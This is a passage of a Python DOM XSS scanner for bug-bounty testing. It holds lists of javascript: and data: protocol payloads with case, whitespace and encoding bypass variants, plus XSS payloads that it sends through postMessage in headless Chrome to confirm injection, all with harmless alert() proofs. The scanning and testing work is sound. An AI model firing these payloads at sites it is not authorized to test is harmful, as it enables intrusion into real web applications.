        print(f"  {Fore.WHITE}Critical:         {Fore.RED}{total_critical}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}High:             {Fore.YELLOW}{total_high}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Reports saved to: {Fore.GREEN}{os.path.abspath(self.args.output_dir)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}{'═' * 70}{Style.RESET_ALL}\n")

    @staticmethod
    def _generate_text_report(result: ScanResult) -> str:
        """Generate a plain text report."""
        lines = []
        lines.append("=" * 70)
        lines.append("DOM XSS VULNERABILITY SCAN REPORT")
        lines.append("=" * 70)
        lines.append(f"Target:       {result.target_url}")
        lines.append(f"Scan Time:    {result.scan_time}")
        lines.append(f"JS Files:     {len(result.js_files)}")
        lines.append(f"Inline:       {len(result.inline_scripts)}")
        lines.append(f"Total JS:     {result.total_js_size / 1024:.1f} KB")
        lines.append(f"Findings:     {len(result.findings)}")
        lines.append("")

        # Severity summary
        severity_counts = {}
        for f in result.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        lines.append("SEVERITY SUMMARY:")
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = severity_counts.get(sev, 0)
            lines.append(f"  {sev.upper():12s}: {count}")
        lines.append("")

        # Individual findings
        lines.append("-" * 70)
        lines.append("DETAILED FINDINGS")
        lines.append("-" * 70)

        for i, f in enumerate(result.findings):
            lines.append("")
            lines.append(f"Finding #{i+1}: {f.vuln_type}")
            lines.append(f"  Severity:    {f.severity.upper()}")
            lines.append(f"  CWE:         {f.cwe_id}")
            lines.append(f"  File:        {f.js_file}")
            lines.append(f"  Line:        {f.line_number}")
            lines.append(f"  Source:      {f.source[:200]}")
            lines.append(f"  Description: {f.description}")
            lines.append(f"  Remediation: {f.remediation}")
            lines.append(f"  Code Snippet:")
            for code_line in f.code_snippet.split('\n'):
                lines.append(f"    {code_line}")
            lines.append("-" * 40)

        # JS files list
        lines.append("")
        lines.append("SCANNED JS FILES:")
        for js in result.js_files:
            lines.append(f"  - {js}")

        lines.append("")
        lines.append("=" * 70)
        lines.append("End of Report")
        lines.append("=" * 70)

        return '\n'.join(lines)


# ─────────────────────────────────────────────
# CLI Argument Parser
# ─────────────────────────────────────────────

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="DOM-Based Vulnerability Scanner & XSS PoC Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -u https://example.com --depth 3 --generate-pocs
  %(prog)s -l urls.txt --threads 10 --report-format all
  %(prog)s --js-file app.js utils.js
  %(prog)s --js-file ./js-directory/
  %(prog)s -u https://example.com --cookies "session=abc123" --proxy http://127.0.0.1:8080
  %(prog)s -u https://example.com --min-severity high --report-format html json

Disclaimer:
  This tool is designed for authorized security testing and bug bounty hunting.
  Always obtain proper authorization before scanning any target.
  Unauthorized scanning is illegal and unethical.
        """,
    )

    # Target specification
    target_group = parser.add_argument_group("Target")
    target_group.add_argument(
        "-u", "--url",
        help="Target URL to scan",
    )
    target_group.add_argument(
        "-l", "--url-list",
        help="File containing list of URLs to scan (one per line)",
    )
    target_group.add_argument(
        "--js-file",
        nargs='+',
        help="Local JavaScript file(s) or directory to analyze",
    )

    # Scan options
    scan_group = parser.add_argument_group("Scan Options")
    scan_group.add_argument(
        "--depth",
        type=int,
        default=2,
        help="Maximum crawl depth (default: 2)",
    )
    scan_group.add_argument(
        "--threads",
        type=int,
        default=5,
        help="Number of concurrent threads for fetching JS files (default: 5)",
    )
    scan_group.add_argument(
        "--all-origins",
        action="store_true",
        help="Include JS files from all origins (not just same-origin)",
    )
    scan_group.add_argument(
        "--no-beautify",
        action="store_true",
        help="Skip JavaScript beautification (faster but less accurate line numbers)",
    )
    scan_group.add_argument(
        "--dynamic",
        action="store_true",
        default=True,
        help="Enable dynamic URL parameter testing for javascript: protocol injection (default: enabled)",
    )
    scan_group.add_argument(
        "--no-dynamic",
        action="store_true",
        help="Disable dynamic URL parameter testing",
    )
    scan_group.add_argument(
        "--extra-params",
        nargs='+',
        help="Additional URL parameter names to test for javascript: protocol injection",
    )
    scan_group.add_argument(
        "--min-severity",
        choices=["critical", "high", "medium", "low", "info"],
        default="info",
        help="Minimum severity level to report (default: info)",
    )

    # Authentication & Network
    network_group = parser.add_argument_group("Network & Authentication")
    network_group.add_argument(
        "--cookies",
        help='Cookies to send with requests (format: "name1=val1; name2=val2")',
    )
    network_group.add_argument(
        "--headers",
        nargs='+',
        help='Custom headers (format: "Header-Name: value")',
    )
    network_group.add_argument(
        "--proxy",
        help="HTTP/HTTPS proxy (e.g., http://127.0.0.1:8080)",
    )

    # Output options
    output_group = parser.add_argument_group("Output")
    output_group.add_argument(
        "-o", "--output-dir",
        default="dom_xss_reports",
        help="Output directory for reports and PoCs (default: dom_xss_reports)",
    )
    output_group.add_argument(
        "--report-format",
        nargs='+',
        choices=["json", "html", "txt", "all"],
        default=["html", "json"],
        help="Report format(s) to generate (default: html json)",
    )
    output_group.add_argument(
        "--generate-pocs",
        action="store_true",
        help="Generate PoC HTML files for critical/high findings",
    )
    output_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose/debug output",
    )

    args = parser.parse_args()

    # Validate that at least one target is specified
    if not args.url and not args.url_list and not args.js_file:
        parser.error("At least one target must be specified: -u URL, -l URL_LIST, or --js-file FILE")

    return args


# ─────────────────────────────────────────────
# Severity Filter Post-Processor
# ─────────────────────────────────────────────

class SeverityFilter:
    """Filters findings based on minimum severity threshold."""

    SEVERITY_RANK = {
        "critical": 0,
        "high": 1,
        "medium": 2,
        "low": 3,
        "info": 4,
    }

    @classmethod
    def filter_findings(cls, findings: List[VulnFinding], min_severity: str) -> List[VulnFinding]:
        """Filter findings to only include those at or above min_severity."""
        min_rank = cls.SEVERITY_RANK.get(min_severity, 4)
        return [
            f for f in findings
            if cls.SEVERITY_RANK.get(f.severity, 4) <= min_rank
        ]


# ─────────────────────────────────────────────
# Dynamic URL Parameter XSS Tester
# ─────────────────────────────────────────────

class DynamicParamTester:
    """
    Dynamically tests URL parameters for javascript: protocol injection
    and other DOM XSS vectors by actually loading pages with payloads.
    Requires: pip install selenium or pip install playwright
    Falls back to heuristic detection if neither is available.
    """

    # Common URL parameter names that may be used for navigation/redirect
    REDIRECT_PARAMS = [
        'loginUrl', 'login_url', 'redirectUrl', 'redirect_url',
        'returnUrl', 'return_url', 'callbackUrl', 'callback_url',
        'next', 'nextUrl', 'next_url', 'goto', 'redirect', 'redir',
        'url', 'link', 'target', 'dest', 'destination', 'forward',
        'fwd', 'return', 'continue', 'continueTo', 'rurl',
        'RelayState', 'service', 'retUrl', 'ret_url', 'back',
        'backUrl', 'back_url', 'success_url', 'error_url',
        'failUrl', 'fail_url', 'logoutUrl', 'logout_url',
    ]

    # javascript: protocol payloads with various bypass techniques
    JS_PROTOCOL_PAYLOADS = [
        'javascript:alert(1337)',
        'javascript:alert(document.domain)',
        'JavaScript:alert(1337)',
        'JAVASCRIPT:alert(1337)',
        'javascript:alert(1)',
        'java\tscript:alert(1)',
        'java\nscript:alert(1)',
        'java\rscript:alert(1)',
        'javascript:document.body.appendChild(document.createElement(\'iframe\')).srcdoc=\'<script>alert(1337)<\\/script>\'',
        'javascript:void(document.body.innerHTML="<img src=x onerror=alert(1337)>")',
        'javascript:eval(atob("YWxlcnQoMTMzNyk="))',
        'data:text/html,<script>alert(1337)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==',
        # URL-encoded variations
        'javascript%3Aalert(1337)',
        'javascript%3aalert(1337)',
        # Double-encoded
        'javascript%253Aalert(1337)',
        # With leading whitespace/special chars
        ' javascript:alert(1337)',
        '\tjavascript:alert(1337)',
        '//javascript:alert(1337)',
        # Case variations
        'jAvAsCrIpT:alert(1337)',
        'JaVaScRiPt:alert(1337)',
    ]

    def __init__(self, session: requests.Session, logger: logging.Logger):
        self.session = session
        self.logger = logger
        self.selenium_available = False
        self.playwright_available = False
        self._check_browser_automation()

    def _check_browser_automation(self):
        """Check if Selenium or Playwright is available for dynamic testing."""
        try:
            from selenium import webdriver
            self.selenium_available = True
            self.logger.info("Selenium detected - dynamic testing enabled")
        except ImportError:
            pass

        if not self.selenium_available:
            try:
                import playwright
                self.playwright_available = True
                self.logger.info("Playwright detected - dynamic testing enabled")
            except ImportError:
                pass

        if not self.selenium_available and not self.playwright_available:
            self.logger.info(
                "No browser automation available. Using heuristic detection. "
                "Install selenium or playwright for full dynamic testing: "
                "pip install selenium"
            )

    def detect_url_params(self, url: str) -> List[str]:
        """Detect URL parameters from the target URL and page source."""
        found_params = set()

        # Extract params from the URL itself
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        found_params.update(query_params.keys())

        # Fetch page and look for parameter usage in JS
        try:
            resp = self.session.get(url, timeout=15)
            page_source = resp.text

            # Look for URL parameter extraction patterns in the page
            param_patterns = [
                r"(?:searchParams|params|urlParams)\.get\s*\(\s*['\"`](\w+)['\"`]\s*\)",
                r"getParameter\s*\(\s*['\"`](\w+)['\"`]\s*\)",
                r"getUrlParam\s*\(\s*['\"`](\w+)['\"`]\s*\)",
                r"getQueryString\s*\(\s*['\"`](\w+)['\"`]\s*\)",
                r"\[['\"`](\w+)['\"`]\]\s*(?:=|\.)",
                r"URLSearchParams\([^)]*\)[\s\S]{0,200}\.get\s*\(\s*['\"`](\w+)['\"`]\s*\)",
            ]

            for pattern in param_patterns:
                matches = re.findall(pattern, page_source, re.IGNORECASE)
                for m in matches:
                    if isinstance(m, tuple):
                        found_params.update(p for p in m if p)
                    else:
                        found_params.add(m)

            # Also check for known redirect parameter names in the source
            for param in self.REDIRECT_PARAMS:
                if param.lower() in page_source.lower():
                    found_params.add(param)

        except requests.RequestException as e:
            self.logger.debug(f"Failed to fetch page for param detection: {e}")

        return list(found_params)

    def heuristic_test(self, url: str, params: List[str]) -> List[VulnFinding]:
        """
        Heuristic-based testing: check if javascript: protocol in URL parameter
        is reflected in the page response in a dangerous context.
        """
        findings = []
        canary = "javascript:XSS_CANARY_1337"

        for param in params:
            try:
                # Build test URL with canary payload
                parsed = urllib.parse.urlparse(url)
                query_dict = urllib.parse.parse_qs(parsed.query)
                query_dict[param] = [canary]
                new_query = urllib.parse.urlencode(query_dict, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

                resp = self.session.get(test_url, timeout=15, allow_redirects=False)
                body = resp.text.lower()
                headers_str = str(resp.headers).lower()

                # Check if canary appears in dangerous contexts
                dangerous_contexts = [
                    # In href attribute
                    f'href="{canary.lower()}"',
                    f"href='{canary.lower()}'",
                    f'href={canary.lower()}',
                    # In location assignment
                    f'location = "{canary.lower()}"',
                    f"location = '{canary.lower()}'",
                    f'location.href = "{canary.lower()}"',
                    f"location.href = '{canary.lower()}'",
                    # In window.open
                    f'window.open("{canary.lower()}"',
                    f"window.open('{canary.lower()}'",
                    # In redirect header
                    f'location: {canary.lower()}',
                    # Raw reflection in script context
                    canary.lower(),
                ]

                for ctx in dangerous_contexts:
                    if ctx in body or ctx in headers_str:
                        # Check if there's protocol filtering
                        has_filter = any(
                            filt in body for filt in [
                                'javascript:', 'protocol', 'startswith',
                                'indexof("http")', "indexof('http')",
                                'allowedprotocol', 'validurl', 'sanitize',
                            ]
                        )

                        severity = "high" if not has_filter else "medium"

                        finding = VulnFinding(
                            vuln_type="javascript_protocol_injection",
                            severity=severity,
                            source=f"URL parameter: {param}",
                            js_file=test_url,
                            line_number=0,
                            code_snippet=f"Parameter '{param}' with value '{canary}' reflected in: {ctx[:100]}",
                            context=f"The URL parameter '{param}' value is reflected in a context that allows javascript: protocol execution. "
                                    f"Test URL: {test_url}",
                            description=f"URL parameter '{param}' is used as a navigation target without javascript: protocol filtering",
                            cwe_id="CWE-79",
                            remediation="Validate URL parameters used for navigation. Block javascript:, data:, and vbscript: protocols.",
                        )
                        findings.append(finding)
                        self.logger.info(
                            f"{Fore.RED}[VULN]{Style.RESET_ALL} javascript: protocol injection "
                            f"via parameter '{param}' - {severity.upper()}"
                        )
                        break

                # Also check for redirect (302/301) with the parameter value
                if resp.status_code in (301, 302, 303, 307, 308):
                    location_header = resp.headers.get('Location', '')
                    if canary.lower() in location_header.lower():
                        finding = VulnFinding(
                            vuln_type="javascript_protocol_injection",
                            severity="critical",
                            source=f"URL parameter: {param} (server-side redirect)",
                            js_file=test_url,
                            line_number=0,
                            code_snippet=f"Redirect to: {location_header}",
                            context=f"Server redirects to the value of '{param}' parameter without validation",
                            description=f"URL parameter '{param}' controls redirect target - javascript: protocol may execute on click",
                            cwe_id="CWE-601",
                            remediation="Validate redirect targets server-side. Block javascript:, data:, vbscript: protocols.",
                        )
                        findings.append(finding)

            except requests.RequestException as e:
                self.logger.debug(f"Heuristic test failed for param '{param}': {e}")

        return findings

    def dynamic_test_selenium(self, url: str, params: List[str]) -> List[VulnFinding]:
        """Full dynamic testing using Selenium - actually executes JS and detects XSS."""
        findings = []

        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.chrome.service import Service
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.common.by import By
            from selenium.common.exceptions import (
                TimeoutException, UnexpectedAlertPresentException,
                NoAlertPresentException, WebDriverException
            )

            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-xss-auditor')

            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(10)

            for param in params:
                for payload in self.JS_PROTOCOL_PAYLOADS[:10]:  # Limit payloads for speed
                    try:
                        parsed = urllib.parse.urlparse(url)
                        query_dict = urllib.parse.parse_qs(parsed.query)
                        query_dict[param] = [payload]
                        new_query = urllib.parse.urlencode(query_dict, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))

                        self.logger.debug(f"Dynamic test: {param}={payload[:50]}...")

                        try:
                            driver.get(test_url)
                        except UnexpectedAlertPresentException:
                            # Alert popped! XSS confirmed!
                            try:
                                alert = driver.switch_to.alert
                                alert_text = alert.text
                                alert.accept()
                            except:
                                alert_text = "alert detected"

                            finding = VulnFinding(
                                vuln_type="javascript_protocol_injection",
                                severity="critical",
                                source=f"URL parameter: {param}",
                                js_file=test_url,
                                line_number=0,
                                code_snippet=f"Payload: {payload}\nAlert text: {alert_text}",
                                context=f"CONFIRMED XSS! Parameter '{param}' with payload '{payload}' "
                                        f"triggered alert({alert_text}) on the target page.",
                                description=f"CONFIRMED: DOM XSS via javascript: protocol injection in '{param}' parameter",
                                cwe_id="CWE-79",
                                remediation="Block javascript:, data:, and vbscript: protocols in URL parameter values used for navigation.",
                                confirmed=True,
                            )
                            findings.append(finding)
                            self.logger.info(
                                f"{Fore.RED}[CONFIRMED XSS]{Style.RESET_ALL} "
                                f"param='{param}' payload='{payload[:60]}' alert='{alert_text}'"
                            )
                            break  # Move to next param

                        # Check if an alert appeared after page load
                        import time as _time
                        _time.sleep(1)
                        try:
                            alert = driver.switch_to.alert
                            alert_text = alert.text
                            alert.accept()

                            finding = VulnFinding(
                                vuln_type="javascript_protocol_injection",
                                severity="critical",
                                source=f"URL parameter: {param}",
                                js_file=test_url,
                                line_number=0,
                                code_snippet=f"Payload: {payload}\nAlert text: {alert_text}",
                                context=f"CONFIRMED XSS! Parameter '{param}' with payload '{payload}' "
                                        f"triggered alert({alert_text}) after page load.",
                                description=f"CONFIRMED: DOM XSS via javascript: protocol injection in '{param}' parameter",
                                cwe_id="CWE-79",
                                remediation="Block javascript:, data:, and vbscript: protocols in URL parameter values.",
                                confirmed=True,
                            )
                            findings.append(finding)
                            self.logger.info(
                                f"{Fore.RED}[CONFIRMED XSS]{Style.RESET_ALL} "
                                f"param='{param}' payload='{payload[:60]}' alert='{alert_text}'"
                            )
                            break
                        except NoAlertPresentException:
                            pass

                    except WebDriverException as e:
                        self.logger.debug(f"WebDriver error: {e}")
                        continue

            driver.quit()

        except ImportError:
            self.logger.warning("Selenium not available for dynamic testing")
        except Exception as e:
            self.logger.error(f"Dynamic testing error: {e}")

        return findings

    def test_url(self, url: str) -> List[VulnFinding]:
        """Run all available tests on a URL."""
        findings = []

        # Step 1: Detect parameters
        params = self.detect_url_params(url)
        self.logger.info(f"Detected {len(params)} URL parameters: {params[:20]}")

        # Filter to likely redirect/navigation params
        redirect_params = [
            p for p in params
            if p.lower() in [rp.lower() for rp in self.REDIRECT_PARAMS]
        ]
        # Also include any params already in the URL
        parsed = urllib.parse.urlparse(url)
        existing_params = list(urllib.parse.parse_qs(parsed.query).keys())
        test_params = list(set(redirect_params + existing_params))

        if not test_params:
            # If no known redirect params found, test all detected params
            test_params = params[:10]  # Limit to first 10

        self.logger.info(f"Testing {len(test_params)} parameters for javascript: injection: {test_params}")

        # Step 2: Heuristic testing (always available)
        self.logger.info("Running heuristic tests...")
        findings.extend(self.heuristic_test(url, test_params))

        # Step 3: Dynamic testing with browser automation if available
        if self.selenium_available:
            self.logger.info("Running Selenium dynamic tests for URL parameters...")
            findings.extend(self.dynamic_test_selenium(url, test_params))

            # Step 4: Dynamic postMessage testing
            self.logger.info("Running Selenium dynamic tests for postMessage handlers...")
            findings.extend(self.dynamic_test_postmessage_selenium(url))

        return findings

    def dynamic_test_postmessage_selenium(self, url: str) -> List[VulnFinding]:
        """
        Dynamically test postMessage handlers for DOM XSS by loading the page,
        sending various XSS payloads via postMessage, and checking for alert execution.
        """
        findings = []

        postmessage_payloads = [
            '<img src=x onerror=alert(1337)>',
            '<svg/onload=alert(1337)>',
            '"><img src=x onerror=alert(1337)>',
            'javascript:alert(1337)',
            '<iframe srcdoc="<script>alert(1337)</script>">',
            '<script>alert(1337)</script>',
            '{"type":"xss","data":"<img src=x onerror=alert(1337)>"}',
            '{"html":"<img src=x onerror=alert(1337)>"}',
            '{"content":"<img src=x onerror=alert(1337)>"}',
            '{"message":"<img src=x onerror=alert(1337)>"}',
            '{"url":"javascript:alert(1337)"}',
            '{"redirect":"javascript:alert(1337)"}',
            '{"action":"javascript:alert(1337)"}',
        ]

        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.common.exceptions import (
                UnexpectedAlertPresentException, NoAlertPresentException,
                WebDriverException, TimeoutException
            )

            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-web-security')

            driver = webdriver.Chrome(options=chrome_options)
            driver.set_page_load_timeout(15)

            try:
                driver.get(url)
            except TimeoutException:
                self.logger.debug(f"Page load timeout for {url}")
                driver.quit()
                return findings
            except WebDriverException as e:
                self.logger.debug(f"WebDriver error loading page: {e}")
                driver.quit()
                return findings

            # Check if page has any message event listeners
            has_listener = driver.execute_script("""
                // Try to detect message event listeners
                var hasListener = false;
                try {
                    // Check for addEventListener('message', ...)
                    var scripts = document.querySelectorAll('script');
                    for (var i = 0; i < scripts.length; i++) {
                        if (scripts[i].textContent && 
                            (scripts[i].textContent.indexOf('addEventListener') !== -1 &&
                             scripts[i].textContent.indexOf('message') !== -1) ||
                            scripts[i].textContent.indexOf('onmessage') !== -1) {
                            hasListener = true;
                            break;
                        }
                    }
                } catch(e) {}
                // Also check inline onmessage
                if (window.onmessage) hasListener = true;
                return hasListener;
            """)

            if not has_listener:
                # Also check external JS files for postMessage handlers
                page_source = driver.page_source
                if 'message' not in page_source.lower() or 'addeventlistener' not in page_source.lower():
                    self.logger.info("No postMessage handlers detected on page, skipping postMessage testing")
                    driver.quit()
                    return findings

            self.logger.info("postMessage handler detected, testing payloads...")

            import time as _time
            for payload in postmessage_payloads:
                try:
                    # Send postMessage with wildcard origin
                    driver.execute_script(f"""
                        try {{
                            window.postMessage({json.dumps(payload)}, '*');
                        }} catch(e) {{}}
                    """)

                    _time.sleep(0.5)

                    # Check for alert
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()

                        finding = VulnFinding(
                            vuln_type="postmessage_xss",
                            severity="critical",
                            source="postMessage event.data",
                            js_file=url,
                            line_number=0,
                            code_snippet=f"Payload sent via postMessage: {payload}\nAlert text: {alert_text}",
                            context=f"CONFIRMED XSS! postMessage payload '{payload}' "
                                    f"triggered alert({alert_text}) on {url}",
                            description=f"CONFIRMED: DOM XSS via postMessage - no origin validation and unsafe data handling",
                            cwe_id="CWE-79",
                            remediation="Validate event.origin against an allowlist. Sanitize event.data before using in innerHTML/eval/location.",
                            confirmed=True,
                        )
                        findings.append(finding)
                        self.logger.info(
                            f"{Fore.RED}[CONFIRMED XSS]{Style.RESET_ALL} "
                            f"postMessage payload='{payload[:60]}' alert='{alert_text}'"
                        )
                        break  # One confirmed is enough

                    except NoAlertPresentException:
                        pass

                except UnexpectedAlertPresentException:
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                    except:
                        alert_text = "alert detected"

                    finding = VulnFinding(
                        vuln_type="postmessage_xss",
                        severity="critical",
                        source="postMessage event.data",
                        js_file=url,
                        line_number=0,
                        code_snippet=f"Payload sent via postMessage: {payload}\nAlert text: {alert_text}",
                        context=f"CONFIRMED XSS! postMessage payload '{payload}' "
                                f"triggered alert({alert_text}) on {url}",
                        description=f"CONFIRMED: DOM XSS via postMessage - no origin validation and unsafe data handling",
                        cwe_id="CWE-79",
                        remediation="Validate event.origin against an allowlist. Sanitize event.data before using in innerHTML/eval/location.",
                        confirmed=True,
                    )
                    findings.append(finding)
                    self.logger.info(
                        f"{Fore.RED}[CONFIRMED XSS]{Style.RESET_ALL} "
                        f"postMessage payload='{payload[:60]}' alert='{alert_text}'"
                    )
                    break

                except WebDriverException as e:
                    self.logger.debug(f"postMessage test error: {e}")
                    continue

            # Also test with JSON object payloads (some handlers expect objects)
            if not findings:
                json_payloads = [
                    {"type": "xss", "data": "<img src=x onerror=alert(1337)>"},
                    {"html": "<img src=x onerror=alert(1337)>"},
                    {"content": "<svg/onload=alert(1337)>"},
                    {"url": "javascript:alert(1337)"},
                    {"action": "eval", "code": "alert(1337)"},
                    {"redirect": "javascript:alert(1337)"},
                    {"template": "<img src=x onerror=alert(1337)>"},
                ]
                for obj_payload in json_payloads:
                    try:
                        driver.execute_script(f"""
                            try {{
                                window.postMessage({json.dumps(obj_payload)}, '*');
                            }} catch(e) {{}}
                        """)
                        _time.sleep(0.5)

                        try:
                            alert = driver.switch_to.alert
                            alert_text = alert.text
                            alert.accept()

                            finding = VulnFinding(
                                vuln_type="postmessage_xss",
                                severity="critical",
                                source="postMessage event.data (JSON object)",
                                js_file=url,
                                line_number=0,
                                code_snippet=f"Payload sent via postMessage: {json.dumps(obj_payload)}\nAlert text: {alert_text}",
                                context=f"CONFIRMED XSS! postMessage JSON payload triggered alert({alert_text}) on {url}",
                                description=f"CONFIRMED: DOM XSS via postMessage with JSON object payload",
                                cwe_id="CWE-79",
                                remediation="Validate event.origin. Sanitize all fields of event.data before DOM insertion.",
                                confirmed=True,
                            )
                            findings.append(finding)
                            self.logger.info(
                                f"{Fore.RED}[CONFIRMED XSS]{Style.RESET_ALL} "
                                f"postMessage JSON payload alert='{alert_text}'"
                            )
                            break
                        except NoAlertPresentException:
                            pass
                    except (UnexpectedAlertPresentException, WebDriverException):
                        try:
                            alert = driver.switch_to.alert
                            alert_text = alert.text
                            alert.accept()
                            finding = VulnFinding(
                                vuln_type="postmessage_xss",
                                severity="critical",
                                source="postMessage event.data (JSON object)",
                                js_file=url,
                                line_number=0,
                                code_snippet=f"Payload: {json.dumps(obj_payload)}\nAlert text: {alert_text}",
                                context=f"CONFIRMED XSS! postMessage JSON payload triggered alert on {url}",
                                description=f"CONFIRMED: DOM XSS via postMessage with JSON object payload",
                                cwe_id="CWE-79",
                                remediation="Validate event.origin. Sanitize all fields of event.data before DOM insertion.",
                                confirmed=True,
                            )
                            findings.append(finding)
                            break
                        except:
                            continue

            driver.quit()

        except ImportError:
            self.logger.warning("Selenium not available for postMessage dynamic testing")
        except Exception as e:
            self.logger.error(f"postMessage dynamic testing error: {e}")

        return findings


# ─────────────────────────────────────────────
# Entry Point
# ─────────────────────────────────────────────

def main():
    """Main entry point for the DOM XSS Scanner."""
    try:
        args = parse_arguments()

        scanner = DOMXSSScanner(args)

        # Run the scanner
        scanner.run()

        # Apply severity filter to results before final output
        if args.min_severity != "info":
            for result in scanner.results:
                result.findings = SeverityFilter.filter_findings(
                    result.findings, args.min_severity
                )

        # Exit with appropriate code
        total_critical = sum(
            1 for r in scanner.results
            for f in r.findings
            if f.severity == "critical"
        )
        total_high = sum(
            1 for r in scanner.results
            for f in r.findings
            if f.severity == "high"
        )

        if total_critical > 0:
            sys.exit(2)  # Critical findings
        elif total_high > 0:
            sys.exit(1)  # High findings
        else:
            sys.exit(0)  # No critical/high findings

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user.{Style.RESET_ALL}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Unexpected error: {e}{Style.RESET_ALL}")
        logging.getLogger("DOMXSSScanner").debug("Full traceback:", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()